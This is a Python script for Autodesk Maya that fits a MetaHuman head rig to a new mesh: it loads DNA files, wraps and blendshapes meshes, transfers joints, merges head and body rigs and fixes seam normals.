# -*- coding: utf-8 -*-
# Metahuman Head Matcher
# (c) Burased Uttha (DEX3D).
# =================================
# Only use in $usr_orig$ machine
# =================================

import maya.cmds as cmds
from maya import mel
import time, os, sys, json, math, pprint

for i in [os.path.dirname(os.path.abspath(__file__))]:
    if not i in sys.path:
        sys.path.insert(0, i)
        print(sys.path[0])
import importlib

#from src import dna_manager
#imp.reload(dna_manager)

class scene:
    @staticmethod
    def get_fps(*_):
        timeUnitSet = {'game': 15, 'film': 24, 'pal': 25, 'ntsc': 30, 'show': 48, 'palf': 50, 'ntscf': 60}
        timeUnit = cmds.currentUnit(q=1, t=1)
        if timeUnit in timeUnitSet:
            return timeUnitSet[timeUnit]
        else:
            return float(str(''.join([i for i in timeUnit if i.isdigit() or i == '.'])))

class util:
    @staticmethod
    def poly_select_traverse(mode=int):
        '''
        mode 1 extend; 2 inside; 3 border;
        '''
        traverse_cmd = 'select `ls -sl`; PolySelectTraverse {}; select `ls -sl`;'.format(mode)
        mel.eval(traverse_cmd)

    @staticmethod
    def get_distance(pos_a, pos_b):
        dx = pos_a[0] - pos_b[0]
        dy = pos_a[1] - pos_b[1]
        dz = pos_a[2] - pos_b[2]
        distance = math.sqrt(dx ** 2 + dy ** 2 + dz ** 2)
        return distance

    @staticmethod
    def create_fit_locator(name='locator', fit_to='', world=False, to_parent=''):
        loc = cmds.spaceLocator()[0]
        loc = cmds.rename(loc, name)
        if fit_to:
            loc = cmds.parent(loc, fit_to, r=1)[0]
        if world:
            loc = cmds.parent(loc, w=1)[0]
        elif to_parent:
            cmds.parent(loc, to_parent)[0]
        return loc

    @staticmethod
    def find_object(relate_name):
        obj_ls = cmds.ls('*{}*'.format(relate_name), type='transform')
        if obj_ls:
            return obj_ls[0]
        else:
            return None

    @staticmethod
    def assign_material_with_textures(obj, color=[1,1,1] ,color_file='', transparency_file='', specular_file='', alpha=[.0, .0, .0],
                                      eccentricity=0.5, specular_roll_off=0.5):
        blinn_material = cmds.shadingNode('blinn', asShader=1)
        if color_file:
            color_texture = cmds.shadingNode('file', asTexture=1)
            cmds.setAttr(color_texture + '.fileTextureName', color_file, type="string")
            cmds.connectAttr(color_texture + '.outColor', blinn_material + '.color', force=1)
        else:
            cmds.setAttr(blinn_material + '.color', color[0], color[1], color[2])
        if transparency_file:
            transparency_texture = cmds.shadingNode('file', asTexture=1)
            cmds.setAttr(transparency_texture + '.fileTextureName', transparency_file, type="string")
            cmds.setAttr(transparency_texture + '.alphaIsLuminance', 1)
            cmds.setAttr(transparency_texture + '.alphaGain', 3)
            cmds.connectAttr(transparency_texture + '.outTransparency', blinn_material + '.transparency', force=1)
        else:
            cmds.setAttr(blinn_material + '.transparency', alpha[0], alpha[1], alpha[2])
        if specular_file:
            specular_texture = cmds.shadingNode('file', asTexture=1)
            cmds.setAttr(specular_texture + '.fileTextureName', specular_file, type="string")
            cmds.connectAttr(specular_texture + '.outAlpha', blinn_material + '.specularColorR', force=1)
            cmds.connectAttr(specular_texture + '.outAlpha', blinn_material + '.specularColorG', force=1)
            cmds.connectAttr(specular_texture + '.outAlpha', blinn_material + '.specularColorB', force=1)
        cmds.select(obj)
        cmds.hyperShade(assign=blinn_material)
        cmds.setAttr(blinn_material + '.diffuse', 1.25)
        cmds.setAttr(blinn_material + '.eccentricity', eccentricity)
        cmds.setAttr(blinn_material + '.specularRollOff', specular_roll_off)
        cmds.setAttr(blinn_material + '.specularColor', 1, 1, 1, type="double3")


    @staticmethod
    def get_center_pivot(obj):
        bbox = cmds.xform(obj, q=1, ws=1, bb=1)
        pivot_x = (bbox[0] + bbox[3]) / 2
        pivot_y = (bbox[1] + bbox[4]) / 2
        pivot_z = (bbox[2] + bbox[5]) / 2
        return [pivot_x, pivot_y, pivot_z]

    @staticmethod
    def get_scale_from_a_to_b(obj_a, obj_b):
        bbox_a = cmds.xform(obj_a, q=1, ws=1, bb=1)
        bbox_b = cmds.xform(obj_b, q=1, ws=1, bb=1)
        scale_x = (bbox_b[3] - bbox_b[0]) / (bbox_a[3] - bbox_a[0])
        scale_y = (bbox_b[4] - bbox_b[1]) / (bbox_a[4] - bbox_a[1])
        scale_z = (bbox_b[5] - bbox_b[2]) / (bbox_a[5] - bbox_a[2])
        return [scale_x, scale_y, scale_z]

    @staticmethod
    def get_vertices_positions(mesh_name):
        vertices = cmds.ls(mesh_name + ".vtx[*]", flatten=1)
        result = {}
        for vertex in vertices:
            vertex_position = cmds.pointPosition(vertex, world=1)
            result[vertex] = vertex_position
        return result

    @staticmethod
    def find_closest_vertex_to_locator(locator_name, vertices_positions):
        locator_position = cmds.pointPosition(locator_name, world=1)
        closest_vertex = None
        min_distance = float('inf')

        for vertex in list(vertices_positions):
            vertex_position = vertices_positions[vertex]
            distance = math.sqrt(
                (locator_position[0] - vertex_position[0]) ** 2 +
                (locator_position[1] - vertex_position[1]) ** 2 +
                (locator_position[2] - vertex_position[2]) ** 2
            )
            if distance < min_distance:
                min_distance = distance
                closest_vertex = vertex
        return closest_vertex

    @staticmethod
    def get_create_fixed_topology(src_mesh, dst_mesh, blend=1.0):
        cmds.setAttr(dst_mesh + '.visibility', 0)
        tmp_mesh = cmds.duplicate(src_mesh, n=dst_mesh + '_tmp_mesh')[0]
        tmp_bs = cmds.blendShape(dst_mesh, tmp_mesh, foc=0, n='_tmp_bs')[0]
        cmds.setAttr('{}.{}'.format(tmp_bs, dst_mesh), 1.0)
        dtms_a = cmds.deltaMush(tmp_mesh, smoothingIterations=200, smoothingStep=1.0, iwc=1, owc=.0)[0]
        dtms_b = cmds.deltaMush(tmp_mesh, smoothingIterations=10, smoothingStep=1.0, iwc=.0, owc=.0)[0]
        cmds.setAttr('{}.{}'.format(dtms_a, 'distanceWeight'), 1.0)
        cmds.setAttr('{}.{}'.format(dtms_b, 'distanceWeight'), 1.0)
        cmds.setAttr('{}.{}'.format(dtms_a, 'envelope'), blend)
        cmds.setAttr('{}.{}'.format(dtms_b, 'envelope'), blend)
        new_mesh = cmds.duplicate(tmp_mesh, n=dst_mesh + '_fixTopology')[0]
        cmds.parent(new_mesh, dst_mesh)
        cmds.parent(new_mesh, w=1)
        cmds.delete([tmp_mesh, dst_mesh])
        new_mesh = cmds.rename(new_mesh, dst_mesh) #replace
        return new_mesh

    @staticmethod
    def create_wrap(source_mesh, target_mesh, weight_threshold=0.0, max_distance=1.0, exclusive_bind=False,
                    auto_weight_threshold=True, falloff_mode=0):
        '''
        # Usage example:
        # selected = cmds.ls(sl=True)
        # create_wrap(selected[0], selected[1])
        '''
        # Get shapes
        source_mesh_shape = cmds.listRelatives(source_mesh, shapes=1)[0]
        target_mesh_shape = cmds.listRelatives(target_mesh, shapes=1)[0]

        # Create wrap deformer
        wrap_node = cmds.deformer(target_mesh, type='wrap')[0]
        cmds.setAttr(wrap_node + '.weightThreshold', weight_threshold)
        cmds.setAttr(wrap_node + '.maxDistance', max_distance)
        cmds.setAttr(wrap_node + '.exclusiveBind', exclusive_bind)
        cmds.setAttr(wrap_node + '.autoWeightThreshold', auto_weight_threshold)
        cmds.setAttr(wrap_node + '.falloffMode', falloff_mode)
        cmds.connectAttr(target_mesh + '.worldMatrix[0]', wrap_node + '.geomMatrix')

        # Add influence
        base = cmds.duplicate(source_mesh, name=source_mesh + '_wrap_base')[0]
        cmds.hide(base)

        # Create dropoff attribute
        if not cmds.attributeQuery('dropoff', n=source_mesh, exists=1):
            cmds.addAttr(source_mesh, sn='dr', ln='dropoff', dv=4.0, min=0.0, max=20.0)
            cmds.setAttr(source_mesh + '.dr', k=1)

        # Connect attributes based on influence type
        if cmds.nodeType(source_mesh_shape) == 'mesh':
            if not cmds.attributeQuery('smoothness', n=source_mesh, exists=1):
                cmds.addAttr(source_mesh, sn='smt', ln='smoothness', dv=0.0, min=0.0)
                cmds.setAttr(source_mesh + '.smt', k=1)

            if not cmds.attributeQuery('inflType', n=source_mesh, exists=1):
                cmds.addAttr(source_mesh, at='short', sn='ift', ln='inflType', dv=2, min=1, max=2)

            cmds.connectAttr(source_mesh_shape + '.worldMesh', wrap_node + '.driverPoints[0]')
            cmds.connectAttr(base + 'Shape.worldMesh', wrap_node + '.basePoints[0]')
            cmds.connectAttr(source_mesh + '.inflType', wrap_node + '.inflType[0]')
            cmds.connectAttr(source_mesh + '.smoothness', wrap_node + '.smoothness[0]')
        elif cmds.nodeType(source_mesh_shape) in ['nurbsCurve', 'nurbsSurface']:
            if not cmds.attributeQuery('wrapSamples', n=source_mesh, exists=1):
                cmds.addAttr(source_mesh, at='short', sn='wsm', ln='wrapSamples', dv=10, min=1)
                cmds.setAttr(source_mesh + '.wsm', k=1)

            cmds.connectAttr(source_mesh_shape + '.ws', wrap_node + '.driverPoints[0]')
            cmds.connectAttr(base + 'Shape.ws', wrap_node + '.basePoints[0]')
            cmds.connectAttr(source_mesh + '.wsm', wrap_node + '.nurbsSamples[0]')

        cmds.connectAttr(source_mesh + '.dropoff', wrap_node + '.dropoff[0]')
        return wrap_node

    @staticmethod
    def get_all_parents(obj):
        parents = []
        while True:
            pparent = cmds.listRelatives(obj, parent=1)
            if not pparent:
                break
            parents.append(pparent[0])
            obj = pparent[0]
        return parents

    @staticmethod
    def create_locator_with_group(name):
        loc_name = name + '_loc'
        offset_name = name + '_offset'
        grp_name = name + '_grp'
        if cmds.objExists(grp_name):
            raise Warning('It has already named \"{}\"'.format(grp_name))
        loc = cmds.spaceLocator(name=loc_name)[0]
        offset = cmds.group(n=offset_name, em=1)
        grp = cmds.group(n=grp_name, em=1)
        cmds.parent(loc, offset);
        cmds.parent(offset, grp)
        return [loc_name, offset_name, grp_name]

    @staticmethod
    def delete_all_display_layer():
        display_layers = cmds.ls(type='displayLayer')
        for layer in display_layers:
            if layer != 'defaultLayer':
                cmds.delete(layer)

class func:
    def __init__(self):
        from src import pose_wrangler
        from src import dna_manager
        from src import blendshape_combiner
        from src import anim_manager
        #pose_wrangler = importlib.import_module('src.pose_wrangler')
        #dna_manager = importlib.import_module('src.dna_manager')
        #blendshape_combiner = importlib.import_module('src.blendshape_combiner')
        import imp
        imp.reload(pose_wrangler)
        imp.reload(dna_manager)
        imp.reload(blendshape_combiner)
        imp.reload(anim_manager)

        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.config_path = self.base_dir + '/config.json'
        self.config = json.load(open(self.config_path))
        self.src_dir = self.base_dir +  '/src'
        self.mdm = dna_manager.metahuman_dna_manager()
        self.mpw = pose_wrangler.metahuman_pose_wrangler()
        self.current_vertices_positions = None
        self.orig_vertices_positions = None
        self.new_vertices_positions = None
        self.body_ns = 'DHIbody'
        self.bc_func = blendshape_combiner
        self.bstf, self.bstf_scn = None, None
        self.bstf_tg_grp = 'newSculpt_mesh_grp'
        self.am_func = anim_manager.sample()

    def get_shared_joint_ls(self):
        jnt_shared_ls = ['clavicle_out_', 'neck_', 'head']
        jnt_ls = cmds.ls(['{}:*{}*_drv'.format(self.body_ns, i) for i in jnt_shared_ls], type='joint')
        jnt_ls += [i.split(':')[-1].replace('_drv', '') for i in jnt_ls]
        return jnt_ls

    def is_shared_joint(self, jnt): # to check same name between body and head
        if not cmds.namespace(ex=':' + self.body_ns):
            return None
        jnt_ls = self.get_shared_joint_ls()
        result = True if jnt in jnt_ls else False
        return result

    def load_plugins(self):
        maya_ver = cmds.about(v=1)
        plugin_key_ls = ['embeddedRL4_path', 'MayaUE4RBFPlugin_path', 'MayaUERBFPlugin_path']
        plugin_ls = ['embeddedRL4.mll', 'MayaUE4RBFPlugin{}.mll'.format(maya_ver), 'MayaUERBFPlugin.mll']
        #print(list(zip(plugin_key_ls, plugin_ls)))
        missing_name_ls = []
        for p in plugin_key_ls:
            plugin_path = self.config[p].replace('\\', '/')
            plugin_name = os.path.basename(plugin_path)
            #print(['Requesting plugin :', plugin_path, os.path.exists(plugin_path)])
            if not os.path.exists(plugin_path):
                missing_name_ls.append(p)
            else:
                plugin_dir = os.path.dirname(plugin_path)
                env_plugin_path_ls = os.environ['MAYA_PLUG_IN_PATH'].split(';')
                env_plugin_path_ls = [i for i in env_plugin_path_ls if os.path.exists(i)]
                if not plugin_dir in env_plugin_path_ls:
                    env_plugin_path_ls += [plugin_dir]
                    os.environ['MAYA_PLUG_IN_PATH'] = ';'.join(env_plugin_path_ls)
                cmds.loadPlugin(plugin_name)
                print('- {} is loaded'.format(plugin_name))
        if missing_name_ls != []:
            er_msg = '--------------\nThese plugins don\'t found\n--------------\n\n' + '\n'.join(missing_name_ls)
            cmds.confirmDialog(message=er_msg, messageAlign='center', icn='warning', button=['Browse'])
            cmds.warning(er_msg)
            # cmds.launch(dir=self.config_path)
            # raise Warning(er_msg)
            fd_result = cmds.fileDialog2(fm=3, okc='Scan plugin')
            fd_result = fd_result[0] if fd_result != None else None
            is_founded = False
            if not fd_result is None:
                for dirpath, dirnames, filenames in os.walk(fd_result):
                    for filename in filenames:
                        path_name = os.path.join(dirpath, filename)
                        if filename in plugin_ls and maya_ver in dirpath and 'Windows' in dirpath:
                            plugin_idx = plugin_ls.index(filename)
                            is_founded = True
                            self.config[plugin_key_ls[plugin_idx]] = path_name.replace('\\', '/')
            if is_founded:
                json.dump(self.config, open(self.config_path, 'w'), indent=4)
                cmds.confirmDialog(message='Plugin path has been updated', messageAlign='center', button=['Continue'])

    def open_dna_scene(self):
        result = cmds.fileDialog(dm='*.dna', title='Load identity')
        dna_path = str(result)
        if dna_path == '':
            return None
        else:
            cmds.file(new=1, force=1)
        self.mdm.set_dna_path(dna_path)
        dna = self.mdm.DNA(dna_path)
        config = self.mdm.RigConfig(
            gui_path=f"{self.mdm.DATA_DIR}/gui.ma",
            analog_gui_path=f"{self.mdm.DATA_DIR}/analog_gui.ma",
            aas_path=self.mdm.ADDITIONAL_ASSEMBLE_SCRIPT,
            lod_filter=[0]
        )

        self.mdm.build_meshes(dna=dna, config=config)
        self.current_vertices_positions = self.mdm.get_current_vertices_positions(dna)
        cmds.select(cmds.ls(type='joint'))
        cmds.viewFit(all=1)
        cmds.select(cl=1)
        util.delete_all_display_layer()
        return dna_path

    def save_dna_scene(self):
        has_body = cmds.namespace(ex=':' + self.body_ns)
        body_path = self.mdm.OUTPUT_DIR + '/{}.ma'.format(self.body_ns)
        if has_body:
            cmds.select( cmds.ls(self.body_ns + ':*') )
            cmds.file(body_path, force=1, options="v=0;", typ="mayaAscii", pr=1, es=1, ch=1, sh=0)

        if self.mdm.DNA_PATH == None:
            raise Warning('Missing self.mdm.DNA_PATH and current_vertices_positions due to UI has been reloaded')
        self.load_plugins()
        dna_path = str(self.mdm.DNA_PATH)
        reader = self.mdm.load_dna_reader(dna_path)
        calibrated = self.mdm.DNACalibDNAReader(reader)
        self.mdm.run_joints_command(reader, calibrated)
        for name, item in self.current_vertices_positions.items():
            new_vertices_positions = self.mdm.get_mesh_vertex_positions_from_scene(name)
            if new_vertices_positions:
                self.mdm.run_vertices_command(
                    calibrated, item["positions"],
                    new_vertices_positions, item["mesh_index"])
        prune_cmd = self.mdm.PruneBlendShapeTargetsCommand()
        prune_cmd.setThreshold(float('inf'))
        prune_cmd.run(calibrated)
        self.mdm.PruneBlendShapeTargetsCommand().run(calibrated)
        self.mdm.save_dna(calibrated)
        self.mdm.assemble_maya_scene()
        self.assign_mh_head_material(dna_path)

        if has_body:
            cmds.file(body_path, i=1, type='mayaAscii', ignoreVersion=1, ra=1, mergeNamespacesOnClash=0,
                      options='v=0;', pr=0, rpr=self.body_ns)
            self.body_assemble()
            self.assign_mh_body_material(dna_path)
            self.body_finalize_assemble()

        cmds.select(cmds.ls(type='joint'))
        util.delete_all_display_layer()
        cmds.viewFit(all=1)
        cmds.select(cl=1)
        cmds.file(save=1) #assemble_maya_scene

    def body_assemble(self):
        cmds.group(n='rig', em=1)
        cmds.parent('head_grp', 'rig')
        cmds.parent(self.body_ns + ':root_drv', w=1)
        if cmds.objExists(self.body_ns + ':Skeletons'):
            cmds.delete(self.body_ns + ':Skeletons')
        [cmds.rename(i, i.split(':')[-1]) for i in [self.body_ns + ':root_drv'] + cmds.listRelatives(self.body_ns + ':root_drv', ad=1)]
        cmds.parent(self.body_ns + ':rig_setup_GRP', 'rig')
        [cmds.rename(i, i.split(':')[-1]) for i in [self.body_ns + ':rig_setup_GRP'] + cmds.listRelatives(self.body_ns + ':rig_setup_GRP', ad=1)]
        cmds.group(n='body_grp', em=1)
        cmds.parent('body_grp', 'rig')
        cmds.namespace(add='DHIhead')
        cmds.parent('spine_04', w=1)
        [cmds.rename(i, 'DHIhead:' + i) for i in ['spine_04'] + cmds.listRelatives('spine_04', ad=1)]
        body_geo_grp = cmds.group('geometry_grp', em=1)
        cmds.parent(body_geo_grp, 'body_grp')
        body_geo_grp = cmds.rename(body_geo_grp, 'geometry_grp')
        body_grp_ls = [cmds.parent(i, body_geo_grp)[0] for i in cmds.listRelatives(self.body_ns + ':export_geo_GRP', c=1)]
        for body_grp in body_grp_ls:
            body_mesh_ls = [body_grp] + cmds.listRelatives(body_grp, ad=1, type='transform')
            [cmds.rename(i, i.split(':')[-1]) for i in body_mesh_ls if cmds.objExists(i)]
        if cmds.objExists(self.body_ns + ':export_geo_GRP'):
            cmds.delete(self.body_ns + ':export_geo_GRP')
        head_jnt_ls = ['DHIhead:spine_04'] + cmds.listRelatives('DHIhead:spine_04', ad=1, type='joint')
        for jnt in head_jnt_ls:
            body_jnt = self.body_ns + ':' +  jnt.split(':')[-1]
            if cmds.objExists(body_jnt):
                print('constraint...', jnt, body_jnt)
                cmds.parentConstraint(body_jnt, jnt, mo=1)
                cmds.scaleConstraint(body_jnt, jnt, mo=1)

    @staticmethod
    def body_finalize_assemble(seam_tolerance=0.025):  # finalize body assemble
        import numpy as np
        def get_vertices(mesh):
            vertices = cmds.ls(f'{mesh}.vtx[*]', fl=1)
            positions = np.array([cmds.pointPosition(vtx, world=1) for vtx in vertices])
            return vertices, positions

        def find_closest_vertices(vertices1, positions1, vertices2, positions2, tolerance=seam_tolerance):
            selected_pairs = []
            for i, pos1 in enumerate(positions1):
                distances = np.linalg.norm(positions2 - pos1, axis=1)
                min_distance_idx = np.argmin(distances)
                if distances[min_distance_idx] <= tolerance:
                    selected_pairs.append((vertices1[i], vertices2[min_distance_idx]))
            return selected_pairs

        def set_avg_normals(closest_pairs):
            for v1, v2 in closest_pairs:
                normal1 = cmds.polyNormalPerVertex(v1, q=1, xyz=1)
                normal2 = cmds.polyNormalPerVertex(v2, q=1, xyz=1)
                avg_normal = [(normal1[0] + normal2[0]) / 2.0,
                              (normal1[1] + normal2[1]) / 2.0,
                              (normal1[2] + normal2[2]) / 2.0]
                length = (avg_normal[0] ** 2 + avg_normal[1] ** 2 + avg_normal[2] ** 2) ** 0.5
                avg_normal = [n / length for n in avg_normal]
                cmds.polyNormalPerVertex(v1, xyz=avg_normal)
                cmds.polyNormalPerVertex(v2, xyz=avg_normal)

        def toggle_envelope(enable=True, skinCluster=True, blendShape=True):
            sc_evl_ls = [i + '.envelope' for i in cmds.ls(type='skinCluster') if cmds.objExists(i + '.envelope')]
            bs_evl_ls = [i + '.envelope' for i in cmds.ls(type='blendShape') if cmds.objExists(i + '.envelope')]
            if enable and skinCluster:
                [cmds.setAttr(i, 1.0) for i in sc_evl_ls]
            else:
                [cmds.setAttr(i, 0.0) for i in sc_evl_ls]
            if enable and blendShape:
                [cmds.setAttr(i, 1.0) for i in bs_evl_ls]
            else:
                [cmds.setAttr(i, 0.0) for i in bs_evl_ls]
            cmds.refresh()

        orig_head_mesh = [i for i in cmds.ls('*head_lod0_mesh') if cmds.getAttr(i + '.visibility') == 1][0]
        orig_body_mesh = [i for i in cmds.ls('*body_lod0_mesh') if cmds.getAttr(i + '.visibility') == 1][0]
        orig_head_hist = cmds.listHistory(orig_head_mesh)
        orig_body_hist = cmds.listHistory(orig_body_mesh)
        # print(orig_body_hist, orig_head_hist)

        toggle_envelope(enable=False, skinCluster=True, blendShape=True)
        head_mesh, body_mesh = cmds.duplicate(orig_head_mesh)[0], cmds.duplicate(orig_body_mesh)[0]
        cmds.hide([orig_body_mesh, orig_head_mesh])
        # print(head_mesh, body_mesh)
        toggle_envelope(enable=True, skinCluster=True, blendShape=True)

        # seam fixing
        vertices1, positions1 = get_vertices(head_mesh)
        vertices2, positions2 = get_vertices(body_mesh)
        cmds.select(clear=1)
        closest_pairs = find_closest_vertices(vertices1, positions1, vertices2, positions2)
        set_avg_normals(closest_pairs)
        # cmds.select( [i[0] for i in closest_pairs] + [i[1] for i in closest_pairs] )

        orig_head_skn = [i for i in orig_head_hist if cmds.objectType(i) == 'skinCluster'][0]
        orig_body_skn = [i for i in orig_body_hist if cmds.objectType(i) == 'skinCluster'][0]
        orig_head_bs = [i for i in orig_head_hist if cmds.objectType(i) == 'blendShape'][0]
        # print(orig_head_skn, orig_body_skn)
        head_influ_ls = cmds.skinCluster(orig_head_skn, q=1, influence=1)
        body_influ_ls = cmds.skinCluster(orig_body_skn, q=1, influence=1)
        # print(head_influ_ls)
        # print(body_influ_ls)

        # new model
        cmds.blendShape(orig_head_bs, e=1, g=head_mesh)
        head_skn = cmds.skinCluster([head_mesh] + head_influ_ls, n='{}_skn'.format(orig_head_mesh))[0]
        body_skn = cmds.skinCluster([body_mesh] + body_influ_ls, n='{}_skn'.format(orig_body_skn))[0]
        cmds.copySkinWeights(ss=orig_head_skn, ds=head_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name', nr=1,
                             sm=1)
        cmds.copySkinWeights(ss=orig_body_skn, ds=body_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name', nr=1,
                             sm=1)

        # replace new model
        cmds.delete([orig_body_mesh, orig_head_mesh])
        head_mesh = cmds.rename(head_mesh, orig_head_mesh)
        body_mesh = cmds.rename(body_mesh, orig_body_mesh)

    def head_mesh_joint_transfer(self, src_head_mesh, dst_head_mesh, dhi_head_spine04='spine_04', rl4_embedded='Jrl4Embedded', fix_topo_weight=1.0):
        skip_jnt_ls = ['_Pupil', '_Tongue']
        for i in [src_head_mesh, dst_head_mesh, dhi_head_spine04]:
            if not cmds.objExists(i):
                raise Warning('Error no obj exists  {}'.format(i))
            if ':' in i:
                raise Warning('Error.. need to remove namespace  {}'.format(i))
        cd_msg = '''
1. Binded Skin Mesh : {0}
2. Destination Mesh : {1}
'''.format(src_head_mesh, dst_head_mesh).strip()
        cd_result = cmds.confirmDialog(title='Confirm', message=cd_msg.format(), button=['Yes', 'No'])
        if cd_result == 'No':
            return None

        def is_skip_jnt(jnt):
            result = False
            for s_j in skip_jnt_ls:
                if s_j in jnt.split(':')[-1]:
                    result = True
            return result

        dst_head_mesh = util.get_create_fixed_topology(src_head_mesh, dst_head_mesh, blend=fix_topo_weight)
        jnt_ls = cmds.listRelatives(dhi_head_spine04, typ='joint', ad=1, c=1)
        cmds.cutKey(jnt_ls)
        jnt_plen_ls = [len(util.get_all_parents(i)) for i in jnt_ls]
        zip_jnt_ls = sorted(list(zip(jnt_plen_ls, jnt_ls)))
        jnt_ls = [dhi_head_spine04] + [i[-1] for i in zip_jnt_ls]
        jnt_ls = [i for i in jnt_ls if not is_skip_jnt(i)]
        # print(len(jnt_ls), jnt_ls)
        cmds.select(jnt_ls)
        cmds.hide(dhi_head_spine04)
        cmds.hide(dst_head_mesh)

        # lod 0 mesh list
        obj_ls = self.get_grp_obj_data()
        obj_ls = obj_ls[list(obj_ls)[0]]

        cmds.progressWindow(endProgress=1)
        cmds.progressWindow(t='MH - Modifier', pr=0, st='Preparing....', ii=0, min=0, max=len(jnt_ls))

        # wrap all mesh
        cmds.progressWindow(e=1, st='Create wrapped node')
        wrap_node_ls = self.create_wrap_nodes()
        print(wrap_node_ls)

        # get vertices position #dst_bs
        cmds.progressWindow(e=1, st='Vertices calculating...')
        dst_bs = cmds.blendShape(dst_head_mesh, src_head_mesh, foc=0, n='dst_bs')[0]
        self.orig_vertices_positions = util.get_vertices_positions(src_head_mesh)
        cmds.setAttr(dst_bs + '.' + dst_head_mesh, 1.0); cmds.refresh();
        self.new_vertices_positions = util.get_vertices_positions(src_head_mesh)

        # duplicate mesh group as destination shape mesh (wrapped)
        cmds.progressWindow(e=1, st='Create wrapped meshes')
        dst_mesh_ls = self.duplicate_mesh_group('dst', lod=0, tx=30.0)
        print('dst_mesh_ls', dst_mesh_ls)

        # duplicate mesh group as base shape mesh
        cmds.progressWindow(e=1, st='Create base meshes')
        sc_evl_ls = [i + '.envelope' for i in cmds.ls(type='skinCluster') if cmds.objExists(i + '.envelope')]
        bs_evl_ls = [i + '.envelope' for i in cmds.ls(type='blendShape') if cmds.objExists(i + '.envelope')]
        [cmds.setAttr(i, 0.0) for i in sc_evl_ls + bs_evl_ls]; cmds.refresh();
        base_mesh_ls = self.duplicate_mesh_group('base', lod=0, tx=-30.0)
        [cmds.setAttr(i, 1.0) for i in sc_evl_ls + bs_evl_ls]; cmds.refresh();
        cmds.setAttr(base_mesh_ls[0] + '.visibility', 0.0)
        print(base_mesh_ls, base_mesh_ls)

        #clear blenshape and wrap
        cmds.delete([dst_bs] + wrap_node_ls)
        cmds.refresh()

        # teeth shapes solving
        tmp_mesh_ls = self.duplicate_mesh_group('tmp', lod=0, tx=-30.0)
        for obj in [i for i in obj_ls if 'teeth_' in i or 'saliva_' in i]:
            tmp_obj = obj + '_tmp'
            dst_obj = obj + '_dst'
            cmds.parent(tmp_obj, dst_mesh_ls[0], r=0)
            dst_pos = util.get_center_pivot(dst_obj)
            target_scale = util.get_scale_from_a_to_b(tmp_obj, dst_obj)
            vt_ls = cmds.ls(tmp_obj + '.vtx[*]', fl=1)
            cmds.xform(vt_ls, scale=target_scale, a=1, os=1)
            tmp_pos = util.get_center_pivot(tmp_obj)
            cmds.xform(vt_ls, r=1, ws=1, t=[dst_pos[i]-tmp_pos[i] for i in range(len(dst_pos))])
            cmds.delete(dst_obj)
            cmds.rename(tmp_obj, dst_obj)
        cmds.delete(tmp_mesh_ls[0])

        jnt_data = []
        for jnt in jnt_ls:
            skip_jnt = is_skip_jnt(jnt)
            if skip_jnt: continue
            jnt_data += [ [jnt, []] ]
        #pprint.pprint(jnt_data)

        self.transfer_joint_location(jnt_ls)
        #cmds.hide(dhi_head_spine04)

        # eye shapes fixing
        tmp_mesh_ls = self.duplicate_mesh_group('tmp', lod=0, tx=-30.0)
        for obj in [i for i in obj_ls if 'eyeLeft' in i or 'eyeRight' in i]:
            tmp_obj = obj + '_tmp'
            dst_obj = obj + '_dst'
            cmds.delete(dst_obj)
            cmds.parent(tmp_obj, dst_mesh_ls[0], r=1)
            cmds.rename(tmp_obj, dst_obj)
        cmds.delete([i for i in tmp_mesh_ls if cmds.objExists(i)])

        # link shape
        #for obj in [i for i in obj_ls if not 'eyeLeft' in i and not 'eyeRight' in i]: #without eyes
        for obj in [i for i in obj_ls]:
            print('fixing shape.... {}'.format(obj))
            base_obj = obj + '_base'
            dst_obj = obj + '_dst'
            src_dup = cmds.duplicate(obj)[0]
            src_dup = cmds.rename(src_dup, obj + '_tmp')
            # temp blendshape
            tmp_bs = cmds.blendShape([dst_obj, src_dup, base_obj], foc=0, n='_tmp_bs')[0]
            cmds.setAttr(tmp_bs + '.' + dst_obj, 1.0)
            cmds.setAttr(tmp_bs + '.' + src_dup, -1.0)
            # pre skin blendshape
            pre_skin_bs = cmds.blendShape([base_obj, obj], foc=1, n=obj + '_pre_skin_bs')[0]
            cmds.setAttr(pre_skin_bs + '.' + base_obj, 1.0)
            cmds.delete([src_dup])
            cmds.refresh()

        # adjustment group
        adjust_grp = cmds.group(em=1, n='adjustment_grp')

        # eye adjustment
        eye_jnt_data = self.get_eye_joint_data()
        eye_rc_jnt, eye_lc_jnt = eye_jnt_data['R']['child'], eye_jnt_data['L']['child']
        eye_rp_jnt, eye_lp_jnt = eye_jnt_data['R']['parent'], eye_jnt_data['L']['parent']
        for jnt in set(list(eye_rc_jnt + eye_lc_jnt)):
            pin_loc = cmds.spaceLocator(n=jnt + '_pin')[0]
            pin_loc = cmds.parent(pin_loc, jnt, r=1)[0]
            pin_loc = cmds.parent(pin_loc, adjust_grp)[0]
            cmds.pointConstraint(pin_loc, jnt, mo=0)
            cmds.setAttr(pin_loc + '.localScale', .25, .25, .3, type='float3')
        eye_r_pos_x = sum([cmds.xform(i, q=1, ws=1, t=1)[0] for i in eye_rp_jnt])/len(eye_rp_jnt)
        eye_r_pos_y = sum([cmds.xform(i, q=1, ws=1, t=1)[1] for i in eye_rp_jnt])/len(eye_rp_jnt)
        eye_r_pos_z = sum([cmds.xform(i, q=1, ws=1, t=1)[2] for i in eye_rp_jnt])/len(eye_rp_jnt)
        eye_r_pos = [eye_r_pos_x, eye_r_pos_y, eye_r_pos_z]
        #print('eye_r_pos', (eye_r_pos_x, eye_r_pos_y, eye_r_pos_z))

        # eye right
        eye_r_loc_grp = util.create_locator_with_group('Eye_R_Adjust')
        cmds.parent(eye_r_loc_grp[-1], adjust_grp, r=1)[0]
        cmds.xform(eye_r_loc_grp[1], ws=1, t=eye_r_pos)  # offset grp
        cmds.xform(eye_r_loc_grp[0], ws=1, t=eye_r_pos)  # locator
        [cmds.pointConstraint(eye_r_loc_grp[0], i, mo=0) for i in eye_rp_jnt]
        cmds.setAttr(eye_r_loc_grp[0] + '.localScale', 3.5, 3.5, 3.5, type='float3')
        # eye left
        eye_l_loc_grp = util.create_locator_with_group('Eye_L_Adjust')
        cmds.parent(eye_l_loc_grp[-1], adjust_grp, r=1)[0]
        cmds.xform(eye_l_loc_grp[1], ws=1, t=eye_r_pos)  # offset grp
        cmds.xform(eye_l_loc_grp[0], ws=1, t=eye_r_pos)  # locator
        cmds.setAttr(eye_l_loc_grp[-1] + '.sx', -1.0)
